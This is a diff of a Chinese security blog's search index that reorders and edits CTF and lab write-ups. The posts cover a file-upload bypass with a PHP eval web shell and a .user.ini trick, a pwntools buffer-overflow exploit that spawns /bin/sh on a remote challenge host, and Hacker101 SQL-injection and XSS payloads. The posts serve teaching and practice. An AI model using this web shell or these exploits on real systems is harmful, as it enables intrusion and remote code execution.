@@ -134,14 +134,14 @@
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_1.png" alt=""></p>
 <p>首先上传一个简单的测试，基本可以猜测后端会检查文件类型，上传PHP类型等直接解析的文件类型的成功概率不大（尝试一下如php3，phtml等常见绕过文件名）。</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_2.png" alt=""></p>
-<p>这回返回报错说检测到&lt;?的存在，这好办直接改成</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" alt=""></p>
+<p>试着改回jpg看看有没有办法，这回报错说检测到&lt;?的存在。<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" alt=""></p>
+<p>绕过&lt;?，我们可以直接改成这样的html标签语句。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p>
-<p>把文件名改成jpg上传之后，发现返回了文件头检测的报错，于是填上GIF的文件头<code>GIF89a</code>尝试骗过去。</p>
+<p>把文件名改成jpg上传之后，发现返回了文件头检测的报错。</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_3.png" alt=""></p>
-<p>这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_8.png" alt=""></p>
+<p>填上GIF的文件头<code>GIF89a</code>尝试骗过去，这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_9.png" alt=""></p>
+<p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p>
 <p>接下来就是查资料了，直接查到P牛关于.user.ini利用的漏洞。</p>
 <p>php解析的时候，同文件夹的ini文件其实是能影响的。</p>
 <p>接下来，利用auto_prepend_file和auto_append_file这两个设置，我们将.user.ini传上去，再利用文件包含漏洞，成功获得了后门的权限。</p>
@@ -200,26 +200,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HCTF-warmup-目录穿越</title>
-    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
-    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
-<p>我们首先来看一下</p>
-<span id="more"></span>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>LFI</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>wp</tag>
-        <tag>LFI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>leetcode-分治-为运算表达式设计优先级</title>
     <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
     <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
@@ -252,6 +232,26 @@
         <tag>leetcode</tag>
         <tag>算法</tag>
         <tag>题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF-warmup-目录穿越</title>
+    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
+    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
+<p>我们首先来看一下</p>
+<span id="more"></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>LFI</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>LFI</tag>
       </tags>
   </entry>
   <entry>
@@ -291,7 +291,7 @@
 <p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
 <p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
-<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#115;&#121;&#115;&#116;&#x65;&#109;&#x40;&#112;&#108;&#x74;">&#115;&#121;&#115;&#116;&#x65;&#109;&#x40;&#112;&#108;&#x74;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x73;&#121;&#x73;&#x74;&#x65;&#109;&#64;&#x70;&#108;&#116;">&#x73;&#121;&#x73;&#x74;&#x65;&#109;&#64;&#x70;&#108;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
 <p>Python的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
@@ -318,6 +318,39 @@
         <tag>wp</tag>
         <tag>xctf</tag>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hacker101系列wp（持续更新中）</title>
+    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
+<span id="more"></span>
+<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
+<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
+<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
+<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
+<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
+<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>comprehensive</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>hacker101</tag>
       </tags>
   </entry>
   <entry>
@@ -362,39 +395,6 @@
         <tag>web</tag>
         <tag>sql</tag>
         <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hacker101系列wp（持续更新中）</title>
-    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
-<span id="more"></span>
-<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
-<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
-<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
-<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
-<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
-<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>comprehensive</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>wp</tag>
-        <tag>hacker101</tag>
       </tags>
   </entry>
 </search>
